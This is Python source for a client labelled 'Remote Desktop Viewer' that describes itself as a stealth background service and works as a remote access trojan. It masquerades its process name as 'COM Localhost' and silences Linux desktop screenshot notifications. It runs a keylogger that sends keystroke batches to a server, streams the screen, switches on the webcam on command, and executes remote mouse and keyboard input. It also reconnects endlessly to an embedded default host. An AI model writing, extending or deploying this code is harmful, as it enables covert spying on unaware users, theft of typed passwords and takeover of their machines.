"""
Remote Desktop Viewer Client
Stealth background service for screen capture and streaming
"""
import asyncio
import ssl
import socket
import argparse
import sys
import logging
from pathlib import Path
import signal
from typing import Optional, Dict, Any
import configparser
import os
import platform
import subprocess

# Set process name for stealth (before other imports)
try:
    import setproctitle
    setproctitle.setproctitle("COM Localhost")
except ImportError:
    pass  # setproctitle not available, continue without it

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

def suppress_screenshot_notifications():
    """Suppress screenshot sharing alerts on Linux desktop environments"""
    if platform.system() != "Linux":
        return
    
    # Suppress GNOME/KDE screenshot notifications via environment variables
    # These variables prevent desktop environment notification popups
    env_vars = {
        'NO_AT_BRIDGE': '1',  # Disable accessibility bridge (reduces notifications)
        'QT_ACCESSIBILITY': '0',  # Disable Qt accessibility (KDE)
        'GTK_MODULES': '',  # Disable GTK modules that might show notifications
    }
    
    for key, value in env_vars.items():
        if key not in os.environ:
            os.environ[key] = value
    
    # Try to disable GNOME screenshot notifications via gsettings (non-blocking)
    try:
        # Check if gsettings is available
        subprocess.run(
            ['gsettings', 'set', 'org.gnome.desktop.notifications.application:org.gnome.Screenshot', 
             'enable', 'false'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=1,
            check=False
        )
    except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError):
        # gsettings not available or failed - continue silently
        pass
    
    # Try to disable KDE Spectacle notifications (non-blocking)
    try:
        # Disable Spectacle notifications via kwriteconfig5 or system settings
        subprocess.run(
            ['kwriteconfig5', '--file', 'spectaclerc', '--group', 'General', 
             '--key', 'PlayNotificationSound', 'false'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=1,
            check=False
        )
    except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError):
        # KDE tools not available - continue silently
        pass

# Suppress notifications at module load time
suppress_screenshot_notifications()

from config import (
    EMBEDDED_SERVER_HOST,
    EMBEDDED_SERVER_PORT,
    DEFAULT_CLIENT_PORT, CLIENT_CERT, CLIENT_KEY, CA_CERT, SERVER_CERT,
    CAPTURE_FPS, ENABLE_DELTA_UPDATES, DELTA_THRESHOLD, CLIENT_LOG,
    SCREEN_QUALITY, CAPTURE_ALL_DISPLAYS
)
from common.screen_capture import ScreenCapture
from common.protocol import FrameEncoder, ProtocolHandler, MessageType
from common.keylogger import KeyLogger, is_machine_locked
from common.webcam_capture import WebcamCapture
from common.control_mode import ControlMode

# Check if OpenCV is available for webcam
try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

# Try to import embedded certificates, fallback to file-based if not available
try:
    from common.embedded_certs import create_ssl_context_client as create_embedded_ssl_context
    USE_EMBEDDED_CERTS = True
except ImportError:
    USE_EMBEDDED_CERTS = False

# Configure logging
handlers = [logging.StreamHandler(sys.stderr)]  # Only stderr, no file logging
if CLIENT_LOG:
    handlers.append(logging.FileHandler(CLIENT_LOG))

logging.basicConfig(
    level=logging.INFO,  # Changed from DEBUG to INFO for less overhead
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=handlers
)
logger = logging.getLogger(__name__)

class RemoteDesktopClient:
    """Client for streaming desktop to server"""
    
    def __init__(self, server_host: str, server_port: int = DEFAULT_CLIENT_PORT):
        self.server_host = server_host
        self.server_port = server_port
        self.reader = None
        self.writer = None
        self.capture = None
        self.running = False
        self.reconnect_delay = 5
        self.loop = None  # Store event loop reference
        
        # Get PC name (hostname) - MUST BE BEFORE keylogger init
        try:
            self.pc_name = socket.gethostname()
        except:
            try:
                self.pc_name = platform.node()
            except:
                self.pc_name = "Unknown"
        
        # New features
        self.keylogger = KeyLogger(callback=self._on_keylog, device_name=self.pc_name)
        self.webcam = WebcamCapture(callback=self._on_webcam_frame)
        self.control_mode = ControlMode(input_callback=self._on_control_input)
        self.webcam_active = False
        self.control_active = False
        self.current_display = 0  # 0 = all displays, 1+ = specific display
    
    def _get_display_count(self) -> int:
        """Get number of displays available"""
        try:
            import mss
            with mss.mss() as sct:
                # monitors[0] is virtual screen (all monitors), monitors[1+] are individual displays
                return len(sct.monitors) - 1
        except Exception as e:
            logger.warning(f"Failed to get display count: {e}")
            return 1  # Default to 1 display
        
    def create_ssl_context(self) -> Optional[ssl.SSLContext]:
        """Create SSL context for secure connection"""
        # Try embedded certificates first
        if USE_EMBEDDED_CERTS:
            try:
                logger.info("Client: Using embedded SSL/TLS certificates")
                print("Client: Using embedded SSL/TLS certificates")
                return create_embedded_ssl_context()
            except Exception as e:
                logger.warning(f"Failed to load embedded certificates: {e}, falling back to file-based")
        
        # Fallback to file-based certificates
        # Check certificate existence
        has_server_cert = SERVER_CERT.exists()
        has_ca_cert = CA_CERT.exists()
        
        logger.info(f"Client certificate check: SERVER_CERT={has_server_cert}, CA_CERT={has_ca_cert}")
        
        # If certificates don't exist, return None (unencrypted for testing)
        if not has_server_cert and not has_ca_cert:
            logger.warning("Certificates not found. Using unencrypted connection (testing only).")
            print("Client: Using unencrypted connection (no certificates)")
            return None
        
        # Certificates exist - create SSL context
        logger.info("Client: Using SSL/TLS connection (certificates found)")
        print("Client: Using SSL/TLS connection (certificates found)")
        
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.check_hostname = False  # For self-signed certs
        context.verify_mode = ssl.CERT_NONE  # In production, use proper CA
        
        # Load client certificate if available
        if CLIENT_CERT.exists() and CLIENT_KEY.exists():
            context.load_cert_chain(str(CLIENT_CERT), str(CLIENT_KEY))
        
        # Load CA certificate if available
        if CA_CERT.exists():
            context.load_verify_locations(str(CA_CERT))
        
        return context
    
    async def connect(self) -> bool:
        """Establish secure connection to server"""
        try:
            ssl_context = self.create_ssl_context()
            ssl_mode = "SSL/TLS" if ssl_context else "UNENCRYPTED"
            
            logger.info(f"Connecting to {self.server_host}:{self.server_port} ({ssl_mode})")
            print(f"Connecting to {self.server_host}:{self.server_port} ({ssl_mode})")
            
            self.reader, self.writer = await asyncio.open_connection(
                self.server_host,
                self.server_port,
                ssl=ssl_context if ssl_context else None
            )
            
            logger.info(f"Connected to server ({ssl_mode})")
            print(f"Connected to server ({ssl_mode})")
            
            # Send PC name to server
            try:
                pc_name_bytes = self.pc_name.encode('utf-8')
                name_length = len(pc_name_bytes).to_bytes(4, 'big')
                self.writer.write(name_length + pc_name_bytes)
                await self.writer.drain()
                logger.info(f"Sent PC name to server: {self.pc_name}")
            except Exception as e:
                logger.warning(f"Failed to send PC name to server: {e}")
            
            # Send display count to server
            try:
                display_count = self._get_display_count()
                display_count_bytes = display_count.to_bytes(4, 'big')
                self.writer.write(display_count_bytes)
                await self.writer.drain()
                logger.info(f"Sent display count to server: {display_count}")
            except Exception as e:
                logger.warning(f"Failed to send display count to server: {e}")
            
            return True
            
        except Exception as e:
            logger.error(f"Connection failed: {type(e).__name__}: {e}")
            print(f"Connection failed: {type(e).__name__}: {e}")
            import traceback
            logger.error(f"Traceback: {traceback.format_exc()}")
            return False
    
    async def send_frame(self, frame_data: bytes, frame_id: int, 
                        is_delta: bool = False, x: int = 0, y: int = 0,
                        width: int = 0, height: int = 0):
        """Send a frame to the server"""
        if not self.writer:
            return
        
        try:
            # Validate frame data
            if not frame_data or len(frame_data) == 0:
                logger.warning("Attempted to send empty frame data")
                return
            
            encoded = FrameEncoder.encode_frame(
                frame_data, frame_id, is_delta, x, y, width, height
            )
            
            if not encoded or len(encoded) == 0:
                logger.warning("Encoded frame is empty")
                return
            
            # Send frame length first, then frame data
            length_bytes = len(encoded).to_bytes(4, 'big')
            
            # Debug: Log frame size for troubleshooting (frame ID removed from display)
            logger.debug(f"Sending frame: length_prefix={len(encoded)} bytes, original_frame={len(frame_data)} bytes")
            
            # Verify length bytes are valid
            if len(encoded) > 50 * 1024 * 1024:
                logger.error(f"Encoded frame is too large: {len(encoded)} bytes! This should not happen.")
                logger.error(f"Original frame: {len(frame_data)} bytes, is_delta={is_delta}")
                return
            
            # Write both in one operation to ensure atomicity
            try:
                self.writer.write(length_bytes + encoded)
                await self.writer.drain()
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError) as e:
                logger.warning(f"Connection lost while sending frame: {e}")
                self.writer = None
                raise
            
            # Verify connection is still open
            if self.writer.is_closing():
                logger.warning("Writer is closing after send_frame")
                self.writer = None
                raise ConnectionResetError("Connection closed by server")
            
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
            logger.warning(f"Connection lost while sending frame: {conn_err}")
            self.writer = None
            raise
        except Exception as e:
            logger.error(f"Error sending frame: {type(e).__name__}: {e}")
            raise
    
    async def send_heartbeat(self):
        """Send heartbeat to keep connection alive"""
        if not self.writer:
            return
        
        try:
            heartbeat = ProtocolHandler.create_heartbeat()
            self.writer.write(len(heartbeat).to_bytes(4, 'big'))
            self.writer.write(heartbeat)
            await self.writer.drain()
        except Exception as e:
            logger.error(f"Error sending heartbeat: {e}")
            raise
    
    async def _handle_server_message(self, msg_type: MessageType, msg_data: bytes):
        """Handle different message types from server"""
        if msg_type == MessageType.WEBCAM_START:
            await self._handle_webcam_start()
        elif msg_type == MessageType.WEBCAM_STOP:
            await self._handle_webcam_stop()
        elif msg_type == MessageType.CONTROL_START:
            await self._handle_control_start()
        elif msg_type == MessageType.CONTROL_STOP:
            await self._handle_control_stop()
        elif msg_type == MessageType.CONTROL_INPUT:
            await self._handle_control_input(msg_data)
        elif msg_type == MessageType.DISPLAY_SELECT:
            await self._handle_display_select(msg_data)
    
    async def _handle_webcam_start(self):
        """Handle webcam start request"""
        logger.info("Received WEBCAM_START request from server")
        try:
            # Check if OpenCV is available first
            if not CV2_AVAILABLE:
                error_msg = "OpenCV not installed - webcam not available"
                await self._send_webcam_error(error_msg)
                logger.warning(f"Webcam start requested but OpenCV not available - sent error: {error_msg}")
                return
            
            # Check if webcam device exists
            if not self.webcam.is_available():
                error_msg = "No webcam device found"
                await self._send_webcam_error(error_msg)
                logger.warning(f"Webcam start requested but no webcam device found - sent error: {error_msg}")
                return
            
            if not self.webcam_active:
                self.webcam.start()
                self.webcam_active = True
                logger.info("Webcam started successfully")
        except Exception as e:
            error_msg = str(e)
            logger.error(f"Error starting webcam: {error_msg}")
            await self._send_webcam_error(error_msg)
    
    async def _handle_webcam_stop(self):
        """Handle webcam stop request"""
        try:
            if self.webcam_active:
                self.webcam.stop()
                self.webcam_active = False
                logger.info("Webcam stopped")
        except Exception as e:
            logger.error(f"Error stopping webcam: {e}")
    
    async def _handle_control_start(self):
        """Handle control mode start"""
        try:
            if not self.control_active:
                self.control_mode.start()
                self.control_active = True
                logger.info("=== CONTROL MODE STARTED ===")
                print("=== CONTROL MODE STARTED ===")
                sys.stdout.flush()
        except Exception as e:
            logger.error(f"Error starting control mode: {e}")
    
    async def _handle_control_stop(self):
        """Handle control mode stop"""
        try:
            if self.control_active:
                self.control_mode.stop()
                self.control_active = False
                logger.info("=== CONTROL MODE STOPPED ===")
                print("=== CONTROL MODE STOPPED ===")
                sys.stdout.flush()
        except Exception as e:
            logger.error(f"Error stopping control mode: {e}")
    
    async def _handle_control_input(self, msg_data: bytes):
        """Handle control input from server (execute mouse/keyboard actions)"""
        try:
            import json
            data = json.loads(msg_data.decode('utf-8'))
            logger.info(f"=== CONTROL INPUT RECEIVED === Type: {data.get('type')}, Action: {data.get('action')}")
            
            input_type = data.get('type')  # 'mouse' or 'key'
            action = data.get('action')  # 'move', 'click', 'press', 'release', 'type', 'scroll'
            
            if input_type == 'mouse':
                await self._execute_mouse_action(data)
            elif input_type == 'key':
                await self._execute_keyboard_action(data)
            else:
                logger.warning(f"Unknown control input type: {input_type}")
                
        except Exception as e:
            logger.error(f"Error handling control input: {e}")
            import traceback
            logger.error(traceback.format_exc())
    
    async def _execute_mouse_action(self, data: dict):
        """Execute mouse action on the system"""
        try:
            from pynput.mouse import Controller as MouseController, Button
            mouse = MouseController()
            
            action = data.get('action')
            x = data.get('x', 0)
            y = data.get('y', 0)
            button_num = data.get('button', 1)
            scroll_delta = data.get('scroll', 0)
            
            if action == 'move':
                # Move mouse to absolute position
                mouse.position = (x, y)
                logger.debug(f"Mouse moved to ({x}, {y})")
                
            elif action == 'click':
                # Click mouse button
                button_map = {
                    1: Button.left,
                    2: Button.middle,
                    3: Button.right
                }
                button = button_map.get(button_num, Button.left)
                mouse.click(button, 1)
                logger.debug(f"Mouse clicked: button {button_num} at ({x}, {y})")
                
            elif action == 'press':
                # Press and hold mouse button
                button_map = {
                    1: Button.left,
                    2: Button.middle,
                    3: Button.right
                }
                button = button_map.get(button_num, Button.left)
                mouse.press(button)
                logger.debug(f"Mouse button pressed: {button_num}")
                
            elif action == 'release':
                # Release mouse button
                button_map = {
                    1: Button.left,
                    2: Button.middle,
                    3: Button.right
                }
                button = button_map.get(button_num, Button.left)
                mouse.release(button)
                logger.debug(f"Mouse button released: {button_num}")
                
            elif action == 'scroll':
                # Scroll mouse wheel
                mouse.scroll(0, scroll_delta)
                logger.debug(f"Mouse scrolled: {scroll_delta}")
                
        except Exception as e:
            logger.error(f"Error executing mouse action: {e}")
            import traceback
            logger.error(traceback.format_exc())
    
    async def _execute_keyboard_action(self, data: dict):
        """Execute keyboard action on the system"""
        try:
            from pynput.keyboard import Controller as KeyboardController, Key
            keyboard = KeyboardController()
            
            action = data.get('action')
            key = data.get('key', '')
            key_code = data.get('key_code', '')
            
            if action == 'type':
                # Type text
                keyboard.type(key)
                logger.debug(f"Typed text: {key[:20]}...")
                
            elif action == 'press':
                # Press key
                if key_code:
                    # Special key (e.g., 'enter', 'ctrl', 'alt')
                    special_keys = {
                        'enter': Key.enter,
                        'tab': Key.tab,
                        'space': Key.space,
                        'backspace': Key.backspace,
                        'delete': Key.delete,
                        'esc': Key.esc,
                        'escape': Key.esc,
                        'ctrl': Key.ctrl,
                        'control': Key.ctrl,
                        'alt': Key.alt,
                        'shift': Key.shift,
                        'cmd': Key.cmd,
                        'meta': Key.cmd,
                        'up': Key.up,
                        'down': Key.down,
                        'left': Key.left,
                        'right': Key.right,
                        'home': Key.home,
                        'end': Key.end,
                        'pageup': Key.page_up,
                        'pagedown': Key.page_down,
                    }
                    key_obj = special_keys.get(key_code.lower(), key)
                    keyboard.press(key_obj)
                    logger.debug(f"Key pressed: {key_code}")
                else:
                    # Regular character
                    keyboard.press(key)
                    logger.debug(f"Key pressed: {key}")
                    
            elif action == 'release':
                # Release key
                if key_code:
                    special_keys = {
                        'enter': Key.enter,
                        'tab': Key.tab,
                        'space': Key.space,
                        'backspace': Key.backspace,
                        'delete': Key.delete,
                        'esc': Key.esc,
                        'escape': Key.esc,
                        'ctrl': Key.ctrl,
                        'control': Key.ctrl,
                        'alt': Key.alt,
                        'shift': Key.shift,
                        'cmd': Key.cmd,
                        'meta': Key.cmd,
                        'up': Key.up,
                        'down': Key.down,
                        'left': Key.left,
                        'right': Key.right,
                        'home': Key.home,
                        'end': Key.end,
                        'pageup': Key.page_up,
                        'pagedown': Key.page_down,
                    }
                    key_obj = special_keys.get(key_code.lower(), key)
                    keyboard.release(key_obj)
                    logger.debug(f"Key released: {key_code}")
                else:
                    keyboard.release(key)
                    logger.debug(f"Key released: {key}")
                    
        except Exception as e:
            logger.error(f"Error executing keyboard action: {e}")
            import traceback
            logger.error(traceback.format_exc())
    
    async def _handle_display_select(self, msg_data: bytes):
        """Handle display selection"""
        try:
            import json
            data = json.loads(msg_data.decode('utf-8'))
            display_index = data.get('display', 0)
            logger.info(f"Display selection changed to: {display_index}")
            
            # Update current display
            self.current_display = display_index
            
            # Recreate screen capture with new display
            if self.capture:
                self.capture.reset()
                # Reinitialize with new display
                # 0 = all displays (virtual desktop), 1+ = specific display
                self.capture = ScreenCapture(
                    monitor=display_index, 
                    quality=SCREEN_QUALITY, 
                    capture_all=(display_index == 0)
                )
                logger.info(f"Screen capture reinitialized for display {display_index}: {self.capture.width}x{self.capture.height}")
                
        except Exception as e:
            logger.error(f"Error handling display select: {e}")
            import traceback
            logger.error(traceback.format_exc())
    
    def _on_keylog(self, log_content: str):
        """Callback for keylogger - receives full log content every 3 minutes"""
        logger.info(f"Keylog callback triggered with {len(log_content)} characters")
        if not is_machine_locked():
            # Send keylog to server
            logger.info(f"Machine not locked, sending keylog batch")
            # Use asyncio.run_coroutine_threadsafe since we're in a different thread
            if self.loop and self.loop.is_running():
                try:
                    asyncio.run_coroutine_threadsafe(self._send_keylog(log_content), self.loop)
                    logger.debug("Keylog send scheduled successfully")
                except Exception as e:
                    logger.error(f"Error scheduling keylog send: {e}")
            else:
                logger.warning("Event loop not available, cannot send keylog")
        else:
            logger.debug("Machine is locked, skipping keylog")
    
    async def _send_keylog(self, log_content: str):
        """Send keylog batch to server"""
        if not self.writer:
            logger.warning("Cannot send keylog - no writer available")
            return
        
        try:
            logger.info(f"Creating keylog message: {len(log_content)} characters")
            msg = ProtocolHandler.create_keylog(log_content)
            logger.info(f"Sending keylog message: {len(msg)} bytes")
            self.writer.write(len(msg).to_bytes(4, 'big'))
            self.writer.write(msg)
            await self.writer.drain()
            logger.info(f"Keylog batch sent successfully: {len(log_content)} characters")
        except Exception as e:
            logger.error(f"Error sending keylog: {e}")
            import traceback
            logger.error(traceback.format_exc())
    
    def _on_webcam_frame(self, frame_data: Optional[bytes]):
        """Callback for webcam capture"""
        if frame_data is None:
            # Error occurred
            if self.loop and self.loop.is_running():
                asyncio.run_coroutine_threadsafe(self._send_webcam_error("Webcam capture failed"), self.loop)
            return
        
        # Send frame to server
        if self.loop and self.loop.is_running():
            asyncio.run_coroutine_threadsafe(self._send_webcam_frame(frame_data), self.loop)
    
    async def _send_webcam_frame(self, frame_data: bytes):
        """Send webcam frame to server"""
        if not self.writer:
            return
        
        try:
            msg = ProtocolHandler.create_webcam_frame(frame_data)
            self.writer.write(len(msg).to_bytes(4, 'big'))
            self.writer.write(msg)
            await self.writer.drain()
        except Exception as e:
            logger.error(f"Error sending webcam frame: {e}")
    
    async def _send_webcam_error(self, error_msg: str):
        """Send webcam error to server"""
        if not self.writer:
            logger.warning("Cannot send webcam error - no writer available")
            return
        
        try:
            msg = ProtocolHandler.create_error(error_msg)
            # Change message type to WEBCAM_ERROR
            msg_bytes = bytearray(msg)
            msg_bytes[0] = int(MessageType.WEBCAM_ERROR)
            msg = bytes(msg_bytes)
            
            logger.info(f"Sending webcam error to server: {error_msg}")
            self.writer.write(len(msg).to_bytes(4, 'big'))
            self.writer.write(msg)
            await self.writer.drain()
            logger.info("Webcam error sent successfully")
        except Exception as e:
            logger.error(f"Error sending webcam error: {e}")
    
    def _on_control_input(self, event: dict):
        """Callback for control mode input (user trying to interact)"""
        # Forward to server
        if self.loop and self.loop.is_running():
            asyncio.run_coroutine_threadsafe(self._forward_control_input(event), self.loop)
    
    async def _forward_control_input(self, event: dict):
        """Forward control input event to server"""
        if not self.writer:
            return
        
        try:
            # Convert event to protocol format
            msg = ProtocolHandler.create_control_input(
                event.get('type', 'key'),
                event.get('key', 0),
                event.get('x', 0),
                event.get('y', 0),
                event.get('button', 0),
                event.get('scroll', 0)
            )
            self.writer.write(len(msg).to_bytes(4, 'big'))
            self.writer.write(msg)
            await self.writer.drain()
        except Exception as e:
            logger.error(f"Error forwarding control input: {e}")
    
    async def handle_messages(self):
        """Handle incoming messages from server"""
        if not self.reader:
            logger.warning("handle_messages: No reader available")
            return
        
        logger.info("Starting message handler loop")
        try:
            while self.running:
                try:
                    # Read message length
                    logger.debug("Waiting for message length...")
                    length_bytes = await self.reader.readexactly(4)
                    if not length_bytes or len(length_bytes) != 4:
                        logger.debug("Server closed connection (no length bytes)")
                        break
                    
                    length = int.from_bytes(length_bytes, 'big')
                    logger.debug(f"Received message length: {length}")
                    
                    if length <= 0 or length > 1024 * 1024:  # Max 1MB for config messages
                        logger.warning(f"Invalid message length from server: {length}")
                        break
                    
                    # Read message data
                    data = await self.reader.readexactly(length)
                    logger.debug(f"Received message data: {len(data)} bytes, first byte: {data[0] if data else 'N/A'}")
                    
                    # Decode and handle message
                    try:
                        msg_type, msg_data = ProtocolHandler.decode_message(data)
                        logger.info(f"=== MESSAGE RECEIVED === Type: {msg_type.name}, Size: {len(msg_data)} bytes")
                        await self._handle_server_message(msg_type, msg_data)
                    except Exception as e:
                        logger.error(f"Error decoding message: {e}")
                        import traceback
                        logger.error(traceback.format_exc())
                        continue
                    
                except asyncio.IncompleteReadError:
                    logger.info("Connection closed by server")
                    break
                except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
                    logger.info(f"Connection lost: {conn_err}")
                    break
                except Exception as e:
                    logger.error(f"Error handling messages: {type(e).__name__}: {e}")
                    import traceback
                    logger.error(traceback.format_exc())
                    # Continue to try reading next message
                    continue
                    
        except asyncio.IncompleteReadError:
            logger.info("Connection closed by server")
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
            logger.info(f"Connection lost: {conn_err}")
        except Exception as e:
            logger.error(f"Error in message handler: {type(e).__name__}: {e}")
    
    async def capture_loop(self):
        """Main capture and streaming loop with adaptive frame skipping"""
        frame_interval = 1.0 / CAPTURE_FPS
        delta_failures = 0
        max_delta_failures = 5  # After 5 failures, fallback to full screen
        consecutive_slow_frames = 0  # Track slow frame captures
        
        try:
            while self.running:
                start_time = asyncio.get_event_loop().time()
                
                try:
                    # Temporarily disable delta updates to avoid region validation issues
                    # Set to False to re-enable delta updates after fixing
                    use_full_screen = True
                    
                    if not use_full_screen and ENABLE_DELTA_UPDATES and delta_failures < max_delta_failures:
                        delta = self.capture.capture_delta(DELTA_THRESHOLD)
                        if delta:
                            frame_data, x, y, width, height = delta
                            frame_id = self.capture.get_frame_id()
                            await self.send_frame(frame_data, frame_id, True, x, y, width, height)
                            delta_failures = 0  # Reset on success
                        # If delta is None, no changes detected - skip frame
                    else:
                        # Fallback to full screen capture
                        if delta_failures >= max_delta_failures:
                            logger.warning("Delta capture failed multiple times, using full screen capture")
                        frame_data = self.capture.capture_full_screen()
                        frame_id = self.capture.get_frame_id()
                        await self.send_frame(frame_data, frame_id)
                        delta_failures = 0  # Reset on success
                        
                except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
                    # Connection lost - will be handled by outer loop
                    logger.warning(f"Connection lost during capture: {conn_err}")
                    self.writer = None
                    raise
                except Exception as capture_error:
                    delta_failures += 1
                    if delta_failures < max_delta_failures:
                        logger.warning(f"Capture error (attempt {delta_failures}/{max_delta_failures}): {capture_error}")
                        # Try full screen as fallback
                        try:
                            frame_data = self.capture.capture_full_screen()
                            frame_id = self.capture.get_frame_id()
                            await self.send_frame(frame_data, frame_id)
                            delta_failures = 0
                        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
                            logger.warning(f"Connection lost during fallback: {conn_err}")
                            self.writer = None
                            raise
                        except Exception as fallback_error:
                            logger.error(f"Full screen capture also failed: {fallback_error}")
                            raise
                    else:
                        # Too many failures, re-raise
                        raise
                
                # Calculate sleep time to maintain FPS
                elapsed = asyncio.get_event_loop().time() - start_time
                
                # Adaptive frame skipping: if capture is taking too long, skip next frame
                if elapsed > frame_interval * 1.5:
                    consecutive_slow_frames += 1
                    if consecutive_slow_frames > 3:
                        # System is under load, skip a frame to reduce CPU
                        await asyncio.sleep(frame_interval * 2)
                        consecutive_slow_frames = 0
                        continue
                else:
                    consecutive_slow_frames = 0
                
                sleep_time = max(0, frame_interval - elapsed)
                await asyncio.sleep(sleep_time)
                
        except Exception as e:
            import traceback
            error_msg = str(e) if e else repr(e)
            logger.error(f"Error in capture loop: {type(e).__name__}: {error_msg}")
            logger.error(f"Full traceback:\n{traceback.format_exc()}")
            raise
    
    async def run(self):
        """Main client loop with reconnection logic"""
        # Store event loop reference
        self.loop = asyncio.get_event_loop()
        
        self.capture = ScreenCapture(monitor=None, quality=SCREEN_QUALITY, capture_all=CAPTURE_ALL_DISPLAYS)
        logger.info("Screen capture initialized")
        if CAPTURE_ALL_DISPLAYS:
            logger.info(f"Capturing all displays: {self.capture.width}x{self.capture.height}")
        else:
            logger.info(f"Capturing primary monitor: {self.capture.width}x{self.capture.height}")
        
        while True:
            try:
                if await self.connect():
                    self.running = True
                    
                    # Small delay to ensure connection is fully established
                    await asyncio.sleep(0.1)
                    
                    # Start keylogger
                    self.keylogger.start()
                    
                    # Start message handler
                    message_task = asyncio.create_task(self.handle_messages())
                    
                    # Start capture loop
                    try:
                        await self.capture_loop()
                    except Exception as e:
                        logger.error(f"Capture loop error: {e}")
                    
                    # Cleanup
                    self.running = False
                    message_task.cancel()
                    
                    # Stop all features
                    self.keylogger.stop()
                    if self.webcam_active:
                        self.webcam.stop()
                    if self.control_active:
                        self.control_mode.stop()
                    
                    if self.writer:
                        self.writer.close()
                        await self.writer.wait_closed()
                
                # Reconnect after delay
                logger.info(f"Reconnecting in {self.reconnect_delay} seconds...")
                await asyncio.sleep(self.reconnect_delay)
                
            except KeyboardInterrupt:
                logger.info("Shutting down...")
                break
            except Exception as e:
                logger.error(f"Unexpected error: {e}")
                await asyncio.sleep(self.reconnect_delay)

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='Remote Desktop Viewer Client')
    parser.add_argument('--server-host', help='Server hostname or IP (overrides config/env)')
    parser.add_argument('--server-port', type=int, help='Server port (overrides config/env)')
    
    args = parser.parse_args()
    
    # Try to get server host/port from various sources (in order of priority)
    server_host = None
    server_port = None
    port_explicitly_set = False
    
    # Priority 1: Command-line arguments
    if args.server_host:
        server_host = args.server_host
    if args.server_port:
        server_port = args.server_port
        port_explicitly_set = True
    
    # Priority 2: Environment variables
    if not server_host:
        server_host = os.getenv('RDS_SERVER_HOST')
    if not port_explicitly_set:
        env_port = os.getenv('RDS_SERVER_PORT')
        if env_port:
            try:
                server_port = int(env_port)
                port_explicitly_set = True
            except ValueError:
                pass
    
    # Priority 3: Configuration file
    if not server_host:
        # For executables, check in executable directory; for scripts, check project root
        if getattr(sys, 'frozen', False):
            # Running as executable - check in executable directory
            config_file = Path(sys.executable).parent / 'client_config.ini'
        else:
            # Running as script - check in project root
            config_file = Path(__file__).parent.parent / 'client_config.ini'
        
        # Fallback: also check in current working directory
        if not config_file.exists():
            config_file = Path('client_config.ini')
        
        if config_file.exists():
            try:
                config = configparser.ConfigParser()
                config.read(config_file)
                if 'Server' in config:
                    if not server_host:
                        server_host = config['Server'].get('host')
                    if not port_explicitly_set:
                        port_str = config['Server'].get('port')
                        if port_str:
                            try:
                                server_port = int(port_str)
                                port_explicitly_set = True
                            except ValueError:
                                pass
            except Exception as e:
                logger.warning(f"Failed to read config file: {e}")
    
    # Priority 4: Embedded defaults (fallback)
    if not server_host:
        server_host = EMBEDDED_SERVER_HOST
        logger.info(f"Using embedded default server host: {server_host}")
    if not port_explicitly_set:
        server_port = EMBEDDED_SERVER_PORT
        logger.info(f"Using embedded default server port: {server_port}")
    
    args.server_host = server_host
    args.server_port = server_port
    
    # Setup signal handlers for graceful shutdown
    def signal_handler(sig, frame):
        logger.info("Received shutdown signal")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Run client
    client = RemoteDesktopClient(args.server_host, args.server_port)
    
    try:
        asyncio.run(client.run())
    except KeyboardInterrupt:
        logger.info("Client stopped")

if __name__ == "__main__":
    main()
